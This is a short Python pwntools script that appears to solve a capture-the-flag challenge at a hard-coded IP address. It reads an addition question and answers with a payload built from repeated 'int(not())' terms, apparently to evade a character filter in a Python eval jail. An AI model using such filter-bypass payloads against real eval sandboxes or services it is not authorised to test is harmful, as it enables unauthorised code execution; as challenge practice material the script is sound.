from pwn import *

# Establish a connection to the service
conn = remote('172.188.82.82', 8010)

conn.recvline()
conn.recvline()
conn.recvline()

# The rest of the question (e.g., "11 + 23 =")
question = conn.recvuntil(b'= ')
log.info(question)

# Parse the question to extract the numbers
parts = question.split(b' ')
num1 = int(parts[5])
num2 = int(parts[7])

# Calculate the result
result = num1 + num2
log.info(f"Calculated Result: {result}")


payload = '+'.join(['int(not())' for _ in range(result)])

# Send the result back to the server
conn.sendline(payload)

# Receive the response from the server
conn.interactive()

# Close the connection
conn.close()